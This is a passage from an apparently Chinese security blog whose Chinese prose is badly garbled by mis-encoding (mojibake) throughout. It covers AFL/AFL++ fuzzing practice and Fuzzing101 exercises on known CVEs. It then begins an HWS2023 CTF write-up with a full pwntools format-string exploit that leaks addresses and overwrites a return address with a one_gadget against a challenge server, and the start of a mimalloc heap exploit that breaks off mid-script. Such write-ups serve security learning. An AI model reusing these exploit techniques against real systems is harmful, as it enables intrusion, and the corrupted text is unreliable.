afl_test<br></code></pre></td></tr></table></figure><p>ç„¶åç”¨idaæ‰“å¼€çœ‹çœ‹è¿™ä¸¤ä¸ªelfæ–‡ä»¶æœ‰ä»€ä¹ˆä¸åŒ</p><p><img src="/img/Fuzz0/0.png" alt="img"></p><p>å¯ä»¥çœ‹åˆ°afl_testé‡Œé¢å‡ºç°äº†è®¸å¤šå¥‡æ€ªçš„ä¸œè¥¿ï¼Œè¿™å…¶å®å°±æ˜¯afl-gccåœ¨ç¼–è¯‘æ—¶å¯¹æµ‹è¯•æºç è¿›è¡Œäº†æ’æ¡©ï¼ˆä¸»è¦æ˜¯**__afl_maby_log**å‡½æ•°ï¼‰</p><p>è¿™äº›è¢«æ’å…¥çš„æ¡©æ€»çš„æ¥è®²ç±»ä¼¼äºä¼ æ„Ÿå™¨ï¼Œå®ç°å¯¹branchã€edgeï¼ˆåˆ†æ”¯ã€è¾¹ç¼˜ï¼‰è¦†ç›–ç‡çš„æ•è·å’Œåˆ†æ”¯ç‚¹çš„ç»Ÿè®¡ï¼Œåœ¨åç»­çš„fuzzæµ‹è¯•ä¸­ä¼šæ ¹æ®è¿™äº›åé¦ˆä¿¡æ¯è¿›è¡Œæ–°çš„è·¯å¾„æ¢ç´¢å’Œæµ‹è¯•ã€‚ï¼ˆå…¶å®é“¸å¸ç¬”è€…ä¹Ÿåˆšåˆšåœ¨çœ‹aflæºç ï¼Œåˆå›åˆ°äº†è¢«æºç æ”¯é…çš„æ—¥å­äº†å‘œå‘œå‘œï¼‰</p><p>æ¥ä¸‹æ¥å¯ä»¥è¯•ç€æ¥çœŸæ­£fuzzä¸€ä¸‹è¿™ä¸ªtest</p><p>å…ˆæä¸¤ä¸ªç©ºæ–‡ä»¶å¤¹å­˜æ”¾è¾“å…¥æ ·ä¾‹å’Œè¾“å‡ºæ ·ä¾‹ï¼Œfuzz_iné‡Œé¢touch ä¸€ä¸ªtestcaseéšä¾¿å†™ç‚¹ä»€ä¹ˆã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> fuzz_in<br><span class="hljs-built_in">mkdir</span> fuzz_out<br><br>/path/to/afl-fuzz -i fuzz_in/ -o fuzz_out/ ./afl_test<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¬¡å°è¯•å¯èƒ½ä¼šæŠ¥é”™éœ€è¦è®¾ç½®ä¸€ä¸‹core_pattern</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">su root<br>echo &gt; <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>core_pattern<br></code></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥æ„‰å¿«çš„afl_fuzzå•¦</p><p>è¿›å»åå¯ä»¥çœ‹åˆ°è¿™æ ·ä¸€ä¸ªç•Œé¢ï¼Œç›¸ä¿¡å¤§å®¶è‹±æ–‡éƒ½æ¯”æˆ‘å¥½ï¼Œå„ç§å‚æ•°çš„å«ä¹‰koreyçœ‹å¾—æ‡‚å¾—å„ä½çœ‹å®˜è€çˆ·ä¹Ÿä¸€å®šçœ‹æ‡‚å˜»å˜»ã€‚</p><p><img src="/img/Fuzz0/1.png" alt="img"></p><p>ç”±äºé“¸å¸ç¬”è€…åªèƒ½ç”¨åƒåœ¾ç¬”è®°æœ¬è·‘ï¼ˆä¹è‰²13900hï¼‰ï¼Œæ‰€ä»¥è·‘äº†å¤§æ¦‚ä¸€ä¸ªå°æ—¶è·‘å‡ºæ¥äº†8ä¸ªcrash</p><p>æ¥ä¸‹æ¥ä¾¿æ˜¯è¿›åˆ°fuzz_outä¸­çœ‹çœ‹æ¯ä¸ªcrashæ˜¯ä»€ä¹ˆæ ·çš„</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">ç”¨ï¼š<br>xxd <span class="hljs-selector-attr">[the name of crash]</span><br>å¯ä»¥æŸ¥çœ‹è§¦å‘crashçš„è¾“å…¥<br></code></pre></td></tr></table></figure><p><img src="/img/Fuzz0/2.png" alt="img"></p><p>crash0æ»¡è¶³äº†buf[0] &#x3D; â€˜Aâ€™ä¸”len &#x3D; 6</p><p>crash1æ»¡è¶³äº†buf[1] &#x3D; â€˜Fâ€™ä¸”len &#x3D; 66</p><p>crash2å› ä¸ºgetså‡½æ•°é€ æˆäº†æ ˆæº¢å‡º</p><p>é—æ†¾çš„æ˜¯buf[2] &#x3D; â€˜Lâ€™ä¸”len &#x3D; 666çš„crashå¹¶æœªè§¦å‘</p><p>ä¹‹åä¾¿å¯ä»¥ä½¿ç”¨gdbå°†testæ–‡ä»¶å’Œcrashæ ·ä¾‹ç»„åˆè°ƒè¯•</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">gdb ./test<br><span class="hljs-built_in">run</span> &lt; [the name of crash]<br></code></pre></td></tr></table></figure><p><img src="/img/Fuzz0/3.png" alt="img"></p><p>ç”¨btå›æº¯å¯ä»¥çœ‹åˆ°stack smashingï¼Œé€ æˆæ ˆæº¢å‡ºäº†</p><h1 id="0x2-Fuzzing-101"><a href="#0x2-Fuzzing-101" class="headerlink" title="0x2:Fuzzing 101"></a>0x2:Fuzzing 101</h1><p>è¿™æ˜¯ä¸ªgithubä¸Šçš„<a href="https://github.com/antonio-morales/Fuzzing101">é¡¹ç›®</a>ï¼Œä¸“é—¨æ¥å¸®åŠ©é‚£äº›æƒ³è¦æŠŠfuzzåº”ç”¨äºå®æˆ˜çš„å¸¦æ‰‹å­ä»¬ã€‚</p><p>é¡¹ç›®ä¸­æœ‰ååˆ†è¯¦ç»†çš„æ­¥éª¤ï¼Œç¬”è€…å°±ä¸åœ¨æ­¤èµ˜è¿°ã€‚ç¬”è€…ä»…åœ¨æ­¤è®°å½•ä¸€äº›æ”¶è·</p><h2 id="exercise-1-Xpdf"><a href="#exercise-1-Xpdf" class="headerlink" title="exercise 1:Xpdf"></a>exercise 1:Xpdf</h2><p>ç¬¬ä¸€ä¸ªexampleæ˜¯ <a href="https://www.cvedetails.com/cve/CVE-2019-13288/">CVE-2019-13288</a></p><p>åœ¨version 4.01.01çš„xpdfä¸­ï¼ŒParser.ccä¸­çš„Parser::getObj()å‡½æ•°å°†ä¼šè¢«æ— é™è°ƒç”¨å¯¼è‡´å†…å­˜è€—å°½ï¼Œæœ€ç»ˆä½¿ç¨‹åºå´©æºƒï¼Œè¾¾åˆ°DoSæ”»å‡»çš„æ•ˆæœã€‚</p><p>æ„Ÿè§‰afl++æ¯”aflå¥½ç”¨ç‚¹</p><p>ã€-Mã€‘ï¼šä¸»fuzzerï¼Œé…åˆã€-Sã€‘å¤šå¼€ä»å±fuzzeræ•ˆç‡å¯ä»¥æé«˜</p><p>å½“è¾“å…¥ä¸ºæ–‡ä»¶æ—¶ï¼Œéœ€è¦ä½¿ç”¨ã€@@ã€‘ï¼Œå¦åˆ™ä¸ºæ ‡å‡†è¾“å…¥</p><p>æ’æ¡©å®Œåæ¢å¤æˆæ­£å¸¸çš„gccç¼–è¯‘</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">CFLAGS</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;-g -O0&quot;</span> CXXFLAGS<span class="hljs-operator">=</span><span class="hljs-string">&quot;-g -O0&quot;</span><br></code></pre></td></tr></table></figure><h2 id="exercise-2-libexif"><a href="#exercise-2-libexif" class="headerlink" title="exercise 2:libexif"></a>exercise 2:libexif</h2><p>åœ¨version 0.6.14 çš„libexifä¸­ï¼Œå­˜åœ¨heap buffer overflow <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3895">CVE-2009-3895</a>ä»¥åŠout-of-bounds read<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-2836">CVE-2012-2836</a></p><p>è¿™è¾¹æ’æ¡©æ—¶ä½¿ç”¨çš„æ˜¯<strong>afl-clang-lto</strong></p><p>ä½†libexifåªæ˜¯ä¸€ä¸ªè§£æã€ä¿å­˜ã€ç¼–è¾‘exifæ•°æ®çš„åº“ï¼Œæ‰€ä»¥è¿˜è¦æœ‰ç›¸åº”çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆexifï¼Œç¼–è¯‘çš„æ—¶å€™åˆ¶å®šä¸€ä¸‹é“¾æ¥åº“æ–‡ä»¶å¤¹ï¼‰æ‰èƒ½æ­£å¸¸å®ç°åŠŸèƒ½</p><p>å°±æœ€åçš„è°ƒè¯•è€Œè¨€ï¼Œé¡¹ç›®ä¸­ä½¿ç”¨çš„eclipseï¼Œå…·æœ‰å›¾å½¢åŒ–ç•Œé¢ï¼Œç¬”è€…è¿˜æ˜¯GDBç”¨çš„ä¹ æƒ¯ï¼Œç›´æ¥</p><p><strong>gdb â€“args</strong> æŒ‡å®šå‚æ•°å°±è¡Œäº†</p><p><img src="/img/Fuzz0/4.png" alt="img"></p><h2 id="exercise-3-tcpdump"><a href="#exercise-3-tcpdump" class="headerlink" title="exercise 3:tcpdump"></a>exercise 3:tcpdump</h2><p>ç›®å‰ä¸ºæ­¢æœ€æŠ˜ç£¨çš„ä¸€é›†</p><p>åœ¨version 4.9.2çš„ Tcpdumpä¸­ï¼ŒBOOTPåè®®æ•°æ®åŒ…å¯ä»¥è§¦å‘out-of-bouds Readï¼Œå…¶å®ä¹Ÿç®—æ˜¯overflowçš„ä¸€ç§ <a href="https://www.cvedetails.com/cve/CVE-2017-13028/">CVE-2017-13028</a></p><p>è¿™æ¬¡é‡‡ç”¨é€Ÿåº¦æ›´å¿«çš„afl-clang-ltoï¼ˆä½†nmdè¿˜æ˜¯fuzzäº†10ä¸ªå°æ—¶æ‰å‡ºæ¥8ä¸ªcrashï¼Œä¸è¿‡ä¸€çœ‹hollkå¸ˆå‚…çš„åšå®¢ï¼Œç”¨afl-clang-fast15ä¸ªå°æ—¶å‡ºä¸€ä¸ªcrashï¼Œå¿ƒé‡Œçªç„¶å¹³è¡¡äº†ä¸€ç‚¹ï¼‰</p><p>ä¸”åœ¨ç¼–è¯‘tcpdumpå’Œæ‰€å¯¹åº”çš„åŠ¨æ€é“¾æ¥åº“æ—¶ï¼ŒåŠ å…¥äº†ASANé€‰é¡¹</p><p><strong>ASANï¼ˆAddress Sanitizerï¼‰æ˜¯é’ˆå¯¹ C&#x2F;C++ çš„å¿«é€Ÿå†…å­˜é”™è¯¯æ£€æµ‹å·¥å…·ï¼Œåœ¨è¿è¡Œæ—¶æ£€æµ‹ C&#x2F;C++ ä»£ç ä¸­çš„å¤šç§å†…å­˜é”™è¯¯</strong></p><p>é“¸å¸ç¬”è€…ä¹Ÿä¸æ˜¯å¾ˆæ‡‚ï¼Œé™„å¸¦ä¸€ä¸ªå®˜æ–¹è¯´æ˜ä¹¦<a href="https://clang.llvm.org/docs/AddressSanitizer.html">AddressSanitizer â€” Clang 18.0.0git documentation (llvm.org)</a></p><p>åé¢æ‰§è¡Œè¿è¡Œtcpdumpå°±èƒ½ç›´æ¥çœ‹åˆ°æŠ¥é”™ï¼Œæ„Ÿè§‰è¿˜æ˜¯æŒºæ–¹ä¾¿çš„ï¼Œå°±æ˜¯ASANè¿è¡Œæ—¶æ‰€éœ€å†…å­˜æœ‰ç‚¹å¤§ï¼Œfuzzçš„æ—¶å€™è¦åŠ ä¸Š <strong>-m none</strong> çš„å‚æ•°è§£é™¤å†…å­˜é™åˆ¶</p><p>è´´ä¸ªå›¾æ„æ€ä¸€ä¸‹</p><p><img src="/img/Fuzz0/6.png" alt="img"></p><p><img src="/img/Fuzz0/7.png" alt="img"></p><h2 id="exercise-4-LibTiff"><a href="#exercise-4-LibTiff" class="headerlink" title="exercise 4:LibTiff"></a>exercise 4:LibTiff</h2><p>é€æ¸ç†Ÿç»ƒï¼Œç¬‘</p><p>å‰é¢è¿˜æ˜¯ç”¨ASANå’ŒAFL++è¿›è¡Œä¸€ä¸ªfuzzæ“ä½œ</p><p>åœ¨æ­¤æ¬¡exerciseä¸­ï¼Œé¡¹ç›®ä½œè€…ç”¨åˆ°äº†<strong>lcov</strong>ï¼Œä¸€ä¸ªåŸºäº<strong>GCC</strong>ä»£ç è¦†ç›–æµ‹è¯•å·¥å…·<strong>gcov</strong>çš„å›¾å½¢å‰ç«¯</p><p>åœ¨ç¼–è¯‘çš„æ—¶å€™</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">CFLAGS</span>=<span class="hljs-string">&quot;--coverage&quot;</span> <span class="hljs-attribute">LDFLAGS</span>=<span class="hljs-string">&quot;--coverage&quot;</span> <br></code></pre></td></tr></table></figure><p>ç¼–è¯‘å®Œæˆåï¼Œè¿›å…¥tiffæ–‡ä»¶å¤¹</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment"># é‡ç½®è®¡æ•°å™¨</span><br>lcov <span class="hljs-params">--zerocounters</span> <span class="hljs-params">--directory</span> <span class="hljs-string">./</span><br><span class="hljs-comment"># è¿”å›åŒ…å«æ¯ä¸ªæ’æ¡©ä»£ç è¡Œé›¶è¦†ç›–ç‡çš„åŸºäºè¡Œçš„è¦†ç›–ç‡æ•°æ®æ–‡ä»¶</span><br>lcov <span class="hljs-params">--capture</span> <span class="hljs-params">--initial</span> <span class="hljs-params">--directory</span> <span class="hljs-string">./</span> <span class="hljs-params">--output-file</span> app.info<br><span class="hljs-comment"># è¿è¡Œç¨‹åº</span><br>$HOME/fuzzing_tiff/install/bin/tiffinfo -D -j -c -r -s -w $HOME/fuzzing_tiff/tiff-4.0.4/test/images/palette-1c-1b.tiff<br><span class="hljs-comment"># å°†å½“å‰çŠ¶æ€è¦†ç›–çŠ¶æ€ä¿å­˜åˆ°ã€app2.infoã€‘æ–‡ä»¶ä¸­</span><br>lcov <span class="hljs-params">--no-checksum</span> <span class="hljs-params">--directory</span> <span class="hljs-string">./</span> <span class="hljs-params">--capture</span> <span class="hljs-params">--output-file</span> app2.info<br></code></pre></td></tr></table></figure><p>ç¬”è€…è¿™è¾¹æŠŠå‰10ä¸ªcrashè¯•äº†è¯•ï¼Œæ„Ÿè§‰ä»£ç è¦†ç›–ç‡ä¸æ˜¯å¾ˆç†æƒ³</p><p><img src="/img/Fuzz0/8.png" alt="img"></p><h2 id="exercise-5-LibXml2"><a href="#exercise-5-LibXml2" class="headerlink" title="exercise 5:LibXml2"></a>exercise 5:LibXml2</h2><p>éš¾ç»·ï¼Œcrashå‡ºä¸æ¥å°±å‡ºä¸æ¥å§</p><p><img src="/img/Fuzz0/9.png" alt="img"></p><p>ç¬¬ä¸€æ¬¡å®Œå…¨æ²¡æœ‰çœ‹é¡¹ç›®é‡Œçš„solutionï¼Œè‡ªå·±è§£å†³ï¼Œç¼–è¯‘çš„æ—¶å€™çœ‹ç¼ºäº†ä¸ªPython.hçš„å¤´æ–‡ä»¶è¿˜è‡ªå·±ç¼–è¯‘äº†ä¸€ä¸ªpythonï¼ˆç¬‘å“­ï¼‰ï¼Œå¥½åœ¨æœ€åæˆåŠŸè·‘èµ·æ¥äº†ã€‚</p><p>ã€ <strong>-x</strong> ã€‘ï¼šæŒ‡å®šå­—å…¸</p><p>ã€ <strong>-D</strong> ã€‘: ç¡®å®šæ€§çªå˜</p><p>ASANçœŸå¥½ç”¨ï¼Œå˜¿å˜¿å˜¿å˜¿</p><h2 id="exercise-6-GIMP"><a href="#exercise-6-GIMP" class="headerlink" title="exercise 6:GIMP"></a>exercise 6:GIMP</h2><p>å¯„ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆfuzz101æä¾›çš„demoä¼šç›´æ¥crashï¼Œæ€ä¹ˆç›´æ¥ä¼šæœ‰memory leakå•Š</p><p><img src="/img/Fuzz0/10.png" alt="img"></p><p>è¯•äº†å¥½å‡ ä¸ªxcfæ–‡ä»¶éƒ½æ˜¯è¿™æ ·</p><h2 id="exercise-7-VLC"><a href="#exercise-7-VLC" class="headerlink" title="exercise 7: VLC"></a>exercise 7: VLC</h2><p>æ›´æŠ½è±¡çš„ä¸€é›†</p><h2 id="exercise-8-Adobe-Reader"><a href="#exercise-8-Adobe-Reader" class="headerlink" title="exercise 8: Adobe Reader"></a>exercise 8: Adobe Reader</h2><p>æ— æºç ç›´æ¥fuzzelfæ–‡ä»¶</p>]]></content>
    
    
    <categories>
      
      <category>Fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fuzz</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HWS2023</title>
    <link href="/2023/07/17/HWS2023/"/>
    <url>/2023/07/17/HWS2023/</url>
    
    <content type="html"><![CDATA[<h1 id="0x0-å†™åœ¨æ‰€æœ‰ä¹‹å‰"><a href="#0x0-å†™åœ¨æ‰€æœ‰ä¹‹å‰" class="headerlink" title="0x0:å†™åœ¨æ‰€æœ‰ä¹‹å‰"></a>0x0:å†™åœ¨æ‰€æœ‰ä¹‹å‰</h1><p>å¾ˆéš¾è¯„ä»·è¿™æ¬¡çš„HWSï¼Œè¿˜ä»¥ä¸ºä¼šæœ‰å›ºä»¶ã€Iotå’Œkernelï¼Œç™½å‡†å¤‡äº†ã€‚</p><p>Miscå’ŒCryptoçœŸçš„pwnæ‰‹åå¤§ç‰¢ï¼Œåªèƒ½å„æŒ‘è½¯æŸ¿å­æäº†ã€‚</p><h1 id="0x1-The-WriteUp-of-Pwn"><a href="#0x1-The-WriteUp-of-Pwn" class="headerlink" title="0x1:The WriteUp of Pwn"></a>0x1:The WriteUp of Pwn</h1><h2 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h2><p>æœ€æ ‡å‡†çš„æ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²</p><p>æ³„éœ²å‡ºæ ˆåœ°å€å’ŒlibcåŸºå€åæ”¹ret_addrä¸ºoggä¸€æŠŠæ¢­å°±å¥½äº†</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs css"># -*- coding: UTF-<span class="hljs-number">8</span> -*-<br>from pwn import *<br>import sys<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>libc = <span class="hljs-built_in">ELF</span>(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>flag=<span class="hljs-number">1</span><br>if flag:<br>    p = <span class="hljs-built_in">remote</span>(<span class="hljs-string">&#x27;60.204.140.184&#x27;</span>, <span class="hljs-number">30030</span>)<br>else:<br>    p = <span class="hljs-built_in">process</span>(<span class="hljs-string">&#x27;./fmt&#x27;</span>)<br>sa = lambda s,n : p.<span class="hljs-built_in">sendafter</span>(s,n)<br>sla = lambda s,n : p.<span class="hljs-built_in">sendlineafter</span>(s,n)<br>sl = lambda s : p.<span class="hljs-built_in">sendline</span>(s)<br>sd = lambda s : p.<span class="hljs-built_in">send</span>(s)<br>rc = lambda n : p.<span class="hljs-built_in">recv</span>(n)<br>ru = lambda s : p.<span class="hljs-built_in">recvuntil</span>(s)<br>ti = lambda : p.<span class="hljs-built_in">interactive</span>()<br>leak = lambda name,addr :log.<span class="hljs-built_in">success</span>(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br><br>payload = b<span class="hljs-string">&#x27;%10$p%18$p%19$p&#x27;</span><br><span class="hljs-built_in">sla</span>(b<span class="hljs-string">&#x27;: &#x27;</span>,payload)<br><br><span class="hljs-built_in">ru</span>(b<span class="hljs-string">&#x27;0x&#x27;</span>)<br>libc.address = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">rc</span>(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stderr_&#x27;</span>]<br><span class="hljs-built_in">ru</span>(b<span class="hljs-string">&#x27;0x&#x27;</span>)<br>stack_addr = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">rc</span>(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0</span>x10<br><span class="hljs-built_in">ru</span>(b<span class="hljs-string">&#x27;0x&#x27;</span>)<br>code_base = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">rc</span>(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0</span>x13e2<br><span class="hljs-built_in">leak</span>(<span class="hljs-string">&quot;libc.address&quot;</span>,libc.address)<br><span class="hljs-built_in">leak</span>(<span class="hljs-string">&quot;stack&quot;</span>,stack_addr)<br><span class="hljs-built_in">leak</span>(<span class="hljs-string">&quot;code_base&quot;</span>,code_base)<br><br>gadget = [<span class="hljs-number">0</span>xe3afe,<span class="hljs-number">0</span>xe3b01,<span class="hljs-number">0</span>xe3b04]<br>one_gadget = libc.address + gadget[<span class="hljs-number">1</span>]<br>target = stack_addr +<span class="hljs-number">0</span>x18<br>low = one_gadget &amp; <span class="hljs-number">0</span>xffff<br>high = (one_gadget &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0</span>xffff<br><br><br>payload = b<span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(low).<span class="hljs-built_in">encode</span>( )+ b<span class="hljs-string">&#x27;c%10$hn&#x27;</span><br>payload += b<span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(high-low).<span class="hljs-built_in">encode</span>() + b<span class="hljs-string">&#x27;c%11$hn&#x27;</span><br>payload = payload.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">0</span>x20,b<span class="hljs-string">&#x27;a&#x27;</span>)<br>payload += <span class="hljs-built_in">p64</span>(target) + <span class="hljs-built_in">p64</span>(target+<span class="hljs-number">2</span>)<br><br><span class="hljs-built_in">sla</span>(b<span class="hljs-string">&#x27;: &#x27;</span>,payload)<br><span class="hljs-built_in">leak</span>(<span class="hljs-string">&quot;onegadget&quot;</span>,one_gadget)<br><span class="hljs-built_in">leak</span>(<span class="hljs-string">&quot;low&quot;</span>,low)<br><span class="hljs-built_in">leak</span>(<span class="hljs-string">&quot;high&quot;</span>,high)<br>p.<span class="hljs-built_in">interactive</span>()<br></code></pre></td></tr></table></figure><h2 id="mi"><a href="#mi" class="headerlink" title="mi"></a>mi</h2><p>ç¬¬ä¸€æ¬¡åšmi_mallocçš„é¢˜ï¼Œåˆšå¼€å§‹åœ¨ubuntu20é‡Œæ‰¾ä¸åˆ°libmimalloc2.0çš„å®‰è£…åŒ…ï¼Œåæ¥é—®äº†xtxå¸ˆå‚…ç›´æ¥ç”¨patchelfä¸­çš„â€â€“add-neededâ€é€‰é¡¹ç›´æ¥æŠŠlibmimalloc.soå’Œlibpthread.soç»™patchè¿›å»å°±å¥½äº†ã€‚</p><p>å› ä¸ºæœ‰freeåæŒ‡é’ˆæœªç½®0ï¼Œä¸”mimallocç”¨æ¥åˆ†é…heapçš„å¤´éƒ¨å¯ä»¥æ³„éœ²å‡ºlibmimallocçš„åŸºåœ°å€ï¼Œlibmimallocçš„åŸºåœ°å€ä¸libcçš„åç§»å›ºå®šï¼Œå› æ­¤å¯ä»¥å¾—åˆ°libcã€‚</p><p>é€šè¿‡è§‚å¯Ÿmi_mallocå‡½æ•°ï¼Œå‘ç°å­˜åœ¨deferred_freeè¿™ä¸ªç±»ä¼¼malloc_hookçš„å‡½æ•°ï¼Œä¸”ä½äºdeferred_free-0x8å¤„çš„deferred_argä¸ºå¯æ§çš„rdxï¼Œäºæ˜¯å¯ä»¥ç›´æ¥setcontextè¿›è¡Œorwï¼Œå †æ ˆç»“åˆå¤ªéº»çƒ¦äº†ã€‚</p><p><img src="/img/HWS2023/0.png" alt="img"></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs vim">import lib2to3.pgen2.tokenize<br><br>from pwn import *<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>libmimalloc = ELF(<span class="hljs-string">&quot;./libmimalloc.so.2&quot;</span>)<br><br><span class="hljs-keyword">p</span> = remote(<span class="hljs-string">&quot;123.60.179.52&quot;</span>,<span class="hljs-number">30208</span>)<br><span class="hljs-keyword">sa</span> = lambda s,n : <span class="hljs-keyword">p</span>.sendafter(s,n)<br><span class="hljs-keyword">sla</span> = lambda s,n : <span class="hljs-keyword">p</span>.sendlineafter(s,n)<br><span class="hljs-keyword">sl</span> = lambda s : <span class="hljs-keyword">p</span>.sendline(s)<br>sd = lambda s : <span class="hljs-keyword">p</span>.send(s)<br>rc = lambda n : <span class="hljs-keyword">p</span>.recv(n)<br><span class="hljs-keyword">ru</span> = lambda s : <span class="hljs-keyword">p</span>.recvuntil(s)<br>ti = lambda : <span class="hljs-keyword">p</span>.interactive()<br>leak = lambda name,addr :<span class="hljs-built_in">log</span>.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+hex(addr))<br><br><span class="hljs-keyword">menu</span> = <span class="hljs-keyword">b</span><span class="hljs-string">&#x27;:\n&#x27;</span><br>def <span class="hljs-built_in">add</span>(size,content):<br>    <span class="hljs-keyword">sla</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;1&#x27;</span>)<br>    <span 